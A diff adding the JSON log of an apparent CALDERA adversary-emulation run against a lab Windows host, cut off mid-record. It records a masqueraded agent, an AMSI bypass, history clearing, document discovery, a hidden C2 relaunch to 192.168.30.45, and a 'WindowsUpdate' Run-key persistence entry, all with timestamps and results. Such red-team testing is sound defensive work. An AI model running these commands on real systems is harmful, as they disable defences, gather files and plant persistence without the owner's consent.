@@ -1,0 +1,2488 @@
+{
+  "op_id": "b5989196-5d0b-4eb8-9571-0dc52e4c654b",
+  "operation": {
+    "id": "b5989196-5d0b-4eb8-9571-0dc52e4c654b",
+    "name": "apt-sim-20260402-100632",
+    "host_group": [
+      {
+        "paw": "fgdafj",
+        "sleep_min": 30,
+        "sleep_max": 60,
+        "watchdog": 0,
+        "group": "red",
+        "architecture": "amd64",
+        "platform": "windows",
+        "server": "http://192.168.30.45:8888",
+        "upstream_dest": "http://192.168.30.45:8888",
+        "username": "WS10\\Administrator",
+        "location": "C:\\Users\\Public\\splunkd.exe",
+        "pid": 6676,
+        "ppid": 8956,
+        "trusted": true,
+        "executors": [
+          "cmd",
+          "psh",
+          "proc"
+        ],
+        "privilege": "Elevated",
+        "exe_name": "splunkd.exe",
+        "host": "WS10",
+        "contact": "HTTP",
+        "proxy_receivers": {},
+        "proxy_chain": [],
+        "origin_link_id": "",
+        "deadman_enabled": true,
+        "available_contacts": [
+          "HTTP"
+        ],
+        "host_ip_addrs": [
+          "192.168.30.24"
+        ],
+        "display_name": "WS10$WS10\\Administrator",
+        "created": "2026-04-01T13:44:55Z",
+        "last_seen": "2026-04-02T08:15:46Z",
+        "links": [
+          {
+            "id": "2804c127-3d46-4aa8-bbc6-48418fbd114b",
+            "paw": "fgdafj",
+            "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+            "plaintext_command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+            "status": 0,
+            "score": 0,
+            "jitter": 0,
+            "decide": "2026-04-01T13:44:55Z",
+            "pin": 0,
+            "pid": "9040",
+            "facts": [],
+            "relationships": [],
+            "used": [],
+            "unique": "2804c127-3d46-4aa8-bbc6-48418fbd114b",
+            "collect": "2026-04-01T13:44:55Z",
+            "finish": "2026-04-01T13:44:55Z",
+            "ability": {
+              "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+              "tactic": "defense-evasion",
+              "technique_name": "Indicator Removal on Host: Clear Command History",
+              "technique_id": "T1070.003",
+              "name": "Avoid logs",
+              "description": "Stop terminal from logging history",
+              "executors": [
+                {
+                  "name": "sh",
+                  "platform": "darwin",
+                  "command": "> $HOME/.bash_history && unset HISTFILE",
+                  "code": null,
+                  "language": null,
+                  "build_target": null,
+                  "payloads": [],
+                  "uploads": [],
+                  "timeout": 60,
+                  "parsers": [],
+                  "cleanup": [],
+                  "variations": [],
+                  "additional_info": {}
+                },
+                {
+                  "name": "sh",
+                  "platform": "linux",
+                  "command": "> $HOME/.bash_history && unset HISTFILE",
+                  "code": null,
+                  "language": null,
+                  "build_target": null,
+                  "payloads": [],
+                  "uploads": [],
+                  "timeout": 60,
+                  "parsers": [],
+                  "cleanup": [],
+                  "variations": [],
+                  "additional_info": {}
+                },
+                {
+                  "name": "psh",
+                  "platform": "windows",
+                  "command": "Clear-History;Clear",
+                  "code": null,
+                  "language": null,
+                  "build_target": null,
+                  "payloads": [],
+                  "uploads": [],
+                  "timeout": 60,
+                  "parsers": [],
+                  "cleanup": [],
+                  "variations": [],
+                  "additional_info": {}
+                }
+              ],
+              "requirements": [],
+              "privilege": null,
+              "repeatable": false,
+              "buckets": [
+                "defense-evasion"
+              ],
+              "additional_info": {},
+              "access": {},
+              "singleton": false,
+              "plugin": "stockpile",
+              "delete_payload": true
+            },
+            "executor": {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Clear-History;Clear",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            "cleanup": 0,
+            "visibility": {
+              "score": 50,
+              "adjustments": []
+            },
+            "host": "WS10",
+            "output": "False",
+            "deadman": false,
+            "agent_reported_time": "2026-04-01T13:44:56Z"
+          }
+        ],
+        "pending_contact": "HTTP",
+        "status": "alive"
+      }
+    ],
+    "adversary": {
+      "adversary_id": "temp-seed-fgdafj-1775117192",
+      "name": "Temp Seed Windows - gruppo1",
+      "description": "Auto-generated seed adversary from 6308830d-3d43-4e01-9057-1a63a25d0b74 for agent fgdafj",
+      "atomic_ordering": [
+        "discovery_users",
+        "amsi_bypass",
+        "collection_files",
+        "c2_internal",
+        "persistence_registry"
+      ],
+      "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+      "tags": [],
+      "has_repeatable_abilities": false,
+      "plugin": ""
+    },
+    "jitter": "2/8",
+    "planner": {
+      "id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a",
+      "name": "atomic",
+      "module": "app.planners.atomic",
+      "params": {},
+      "description": "During each phase of the operation, the atomic planner iterates through each agent and sends the next\navailable ability it thinks that agent can complete. This decision is based on the agent matching the operating\nsystem (execution platform) of the ability and the ability command having no unsatisfied variables.\nThe planner then waits for each agent to complete its command before determining the subsequent abilities.\nThe abilities are processed in the order set by each agent's atomic ordering.\nFor instance, if agent A has atomic ordering (A1, A2, A3) and agent B has atomic ordering (B1, B2, B3), then\nthe planner would send (A1, B1) in the first phase, then (A2, B2), etc.\n",
+      "stopping_conditions": [],
+      "ignore_enforcement_modules": [],
+      "allow_repeatable_abilities": false,
+      "plugin": ""
+    },
+    "start": "2026-04-02T08:06:32Z",
+    "state": "finished",
+    "obfuscator": "plain-text",
+    "autonomous": 1,
+    "chain": [
+      {
+        "id": "1819c5bc-8eca-48a6-9eef-fbecb36df769",
+        "paw": "fgdafj",
+        "command": "whoamiwhoami /privnet usernet localgroup administrators",
+        "plaintext_command": "whoamiwhoami /privnet usernet localgroup administrators",
+        "status": 1,
+        "score": 0,
+        "decide": "2026-04-02T08:06:33Z",
+        "pin": 0,
+        "pid": "6104",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "1819c5bc-8eca-48a6-9eef-fbecb36df769",
+        "collect": "2026-04-02T08:06:39Z",
+        "finish": "2026-04-02T08:06:39Z",
+        "ability": {
+          "ability_id": "discovery_users",
+          "tactic": "discovery",
+          "technique_name": "System Owner/User Discovery",
+          "technique_id": "T1033",
+          "name": "User Discovery",
+          "description": "Enumerate current identity, privileges, and administrators.",
+          "executors": [
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "discovery"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-02T08:06:39Z"
+      },
+      {
+        "id": "420809c8-7777-4c24-bef8-677da2b7d67a",
+        "paw": "fgdafj",
+        "command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$s.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)",
+        "plaintext_command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$s.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)",
+        "status": 0,
+        "score": 0,
+        "decide": "2026-04-02T08:06:44Z",
+        "pin": 0,
+        "pid": "6684",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "420809c8-7777-4c24-bef8-677da2b7d67a",
+        "collect": "2026-04-02T08:07:31Z",
+        "finish": "2026-04-02T08:07:31Z",
+        "ability": {
+          "ability_id": "amsi_bypass",
+          "tactic": "defense-evasion",
+          "technique_name": "Impair Defenses",
+          "technique_id": "T1562.001",
+          "name": "AMSI Bypass",
+          "description": "Disable AMSI for the current PowerShell runspace.",
+          "executors": [
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n$f=$s.GetField('amsiInitFailed','NonPublic,Static');\n$f.SetValue($null,$true)\n",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "defense-evasion"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n$f=$s.GetField('amsiInitFailed','NonPublic,Static');\n$f.SetValue($null,$true)\n",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "False",
+        "deadman": false,
+        "agent_reported_time": "2026-04-02T08:07:31Z"
+      },
+      {
+        "id": "adbe4b12-2ce6-4f95-8c27-3d5b067d7f35",
+        "paw": "fgdafj",
+        "command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}",
+        "plaintext_command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}",
+        "status": 0,
+        "score": 0,
+        "decide": "2026-04-02T08:07:32Z",
+        "pin": 0,
+        "pid": "4316",
+        "facts": [
+          {
+            "unique": "host.file.pathC:\\Users\\Administrator\\Desktop\\Nuovo documento di testo.txt",
+            "trait": "host.file.path",
+            "name": "host.file.path",
+            "value": "C:\\Users\\Administrator\\Desktop\\Nuovo documento di testo.txt",
+            "created": "2026-04-02T08:08:14Z",
+            "score": 1,
+            "source": "b5989196-5d0b-4eb8-9571-0dc52e4c654b",
+            "origin_type": "LEARNED",
+            "links": [
+              "adbe4b12-2ce6-4f95-8c27-3d5b067d7f35"
+            ],
+            "relationships": [],
+            "limit_count": -1,
+            "collected_by": [
+              "fgdafj"
+            ],
+            "technique_id": "T1005"
+          },
+          {
+            "unique": "host.file.pathC:\\Users\\Administrator\\Downloads\\Sysmon\\Eula.txt",
+            "trait": "host.file.path",
+            "name": "host.file.path",
+            "value": "C:\\Users\\Administrator\\Downloads\\Sysmon\\Eula.txt",
+            "created": "2026-04-02T08:08:14Z",
+            "score": 1,
+            "source": "b5989196-5d0b-4eb8-9571-0dc52e4c654b",
+            "origin_type": "LEARNED",
+            "links": [
+              "adbe4b12-2ce6-4f95-8c27-3d5b067d7f35"
+            ],
+            "relationships": [],
+            "limit_count": -1,
+            "collected_by": [
+              "fgdafj"
+            ],
+            "technique_id": "T1005"
+          }
+        ],
+        "relationships": [],
+        "used": [],
+        "unique": "adbe4b12-2ce6-4f95-8c27-3d5b067d7f35",
+        "collect": "2026-04-02T08:08:12Z",
+        "finish": "2026-04-02T08:08:14Z",
+        "ability": {
+          "ability_id": "collection_files",
+          "tactic": "collection",
+          "technique_name": "Data from Local System",
+          "technique_id": "T1005",
+          "name": "Sensitive File Discovery",
+          "description": "Search for common document types under C:\\Users.",
+          "executors": [
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 120,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "collection"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 120,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-02T08:08:12Z"
+      },
+      {
+        "id": "77d32750-a1de-4499-85e5-8b77bdbd14e3",
+        "paw": "fgdafj",
+        "command": "Start-Process C:\\Users\\Public\\splunkd.exe `-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `-WindowStyle Hidden",
+        "plaintext_command": "Start-Process C:\\Users\\Public\\splunkd.exe `-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `-WindowStyle Hidden",
+        "status": 1,
+        "score": 0,
+        "decide": "2026-04-02T08:08:14Z",
+        "pin": 0,
+        "pid": "9808",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "77d32750-a1de-4499-85e5-8b77bdbd14e3",
+        "collect": "2026-04-02T08:09:01Z",
+        "finish": "2026-04-02T08:09:01Z",
+        "ability": {
+          "ability_id": "c2_internal",
+          "tactic": "command-and-control",
+          "technique_name": "Application Layer Protocol",
+          "technique_id": "T1071.001",
+          "name": "Internal C2",
+          "description": "Start an agent process against the internal CALDERA HTTP listener.",
+          "executors": [
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `\n-WindowStyle Hidden\n",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "command-and-control"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `\n-WindowStyle Hidden\n",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-02T08:09:00Z"
+      },
+      {
+        "id": "4d6ab1d9-1447-493f-b276-eead40153cbb",
+        "paw": "fgdafj",
+        "command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `-Name \"WindowsUpdate\" `-Value \"C:\\Users\\Public\\splunkd.exe\" -Force",
+        "plaintext_command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `-Name \"WindowsUpdate\" `-Value \"C:\\Users\\Public\\splunkd.exe\" -Force",
+        "status": 1,
+        "score": 0,
+        "decide": "2026-04-02T08:09:02Z",
+        "pin": 0,
+        "pid": "5168",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "4d6ab1d9-1447-493f-b276-eead40153cbb",
+        "collect": "2026-04-02T08:09:49Z",
+        "finish": "2026-04-02T08:09:49Z",
+        "ability": {
+          "ability_id": "persistence_registry",
+          "tactic": "persistence",
+          "technique_name": "Registry Run Keys / Startup Folder",
+          "technique_id": "T1547.001",
+          "name": "Registry Persistence",
+          "description": "Create a Run key for persistence.",
+          "executors": [
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `\n-Name \"WindowsUpdate\" `\n-Value \"C:\\Users\\Public\\splunkd.exe\" -Force\n",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "persistence"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `\n-Name \"WindowsUpdate\" `\n-Value \"C:\\Users\\Public\\splunkd.exe\" -Force\n",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-02T08:09:48Z"
+      }
+    ],
+    "auto_close": true,
+    "visibility": 51,
+    "objective": {
+      "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+      "name": "default",
+      "description": "This is a default objective that runs forever.",
+      "goals": [
+        {
+          "target": "exhaustion",
+          "value": "complete",
+          "count": 1048576,
+          "operator": "==",
+          "achieved": false
+        }
+      ],
+      "percentage": 0.0
+    },
+    "use_learning_parsers": true,
+    "group": "red",
+    "source": {
+      "id": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "name": "basic",
+      "facts": [
+        {
+          "unique": "file.sensitive.extensionwav",
+          "trait": "file.sensitive.extension",
+          "name": "file.sensitive.extension",
+          "value": "wav",
+          "created": "2026-04-02T08:06:32Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "SEEDED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": null
+        },
+        {
+          "unique": "file.sensitive.extensionyml",
+          "trait": "file.sensitive.extension",
+          "name": "file.sensitive.extension",
+          "value": "yml",
+          "created": "2026-04-02T08:06:32Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "SEEDED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": null
+        },
+        {
+          "unique": "file.sensitive.extensionpng",
+          "trait": "file.sensitive.extension",
+          "name": "file.sensitive.extension",
+          "value": "png",
+          "created": "2026-04-02T08:06:32Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "SEEDED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": null
+        },
+        {
+          "unique": "server.malicious.urlkeyloggedsite.com",
+          "trait": "server.malicious.url",
+          "name": "server.malicious.url",
+          "value": "keyloggedsite.com",
+          "created": "2026-04-02T08:06:32Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "SEEDED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": null
+        }
+      ],
+      "rules": [
+        {
+          "action": "DENY",
+          "trait": "file.sensitive.extension",
+          "match": ".*"
+        },
+        {
+          "action": "ALLOW",
+          "trait": "file.sensitive.extension",
+          "match": "png"
+        },
+        {
+          "action": "ALLOW",
+          "trait": "file.sensitive.extension",
+          "match": "yml"
+        },
+        {
+          "action": "ALLOW",
+          "trait": "file.sensitive.extension",
+          "match": "wav"
+        }
+      ],
+      "adjustments": [],
+      "relationships": [],
+      "plugin": "stockpile"
+    }
+  },
+  "api_mode": "v2",
+  "poll_history": [
+    {
+      "ts": "2026-04-02T08:06:35Z",
+      "state": "running",
+      "links": 1,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:06:39Z",
+      "state": "running",
+      "links": 1,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:06:43Z",
+      "state": "running",
+      "links": 1,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:06:48Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:06:52Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:06:56Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:00Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:05Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:09Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:13Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:18Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:22Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:26Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:31Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:35Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:40Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:44Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:48Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:52Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:07:57Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:01Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:05Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:09Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:14Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:18Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:22Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:27Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:31Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:35Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:39Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:44Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:48Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:52Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:08:56Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:01Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:05Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:09Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:14Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:18Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:22Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:26Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:31Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:35Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:39Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:44Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:48Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1124,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:50Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:53Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:56Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:09:59Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:01Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:04Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:07Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:09Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:12Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:15Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:18Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:20Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:23Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:26Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:28Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:31Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:34Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
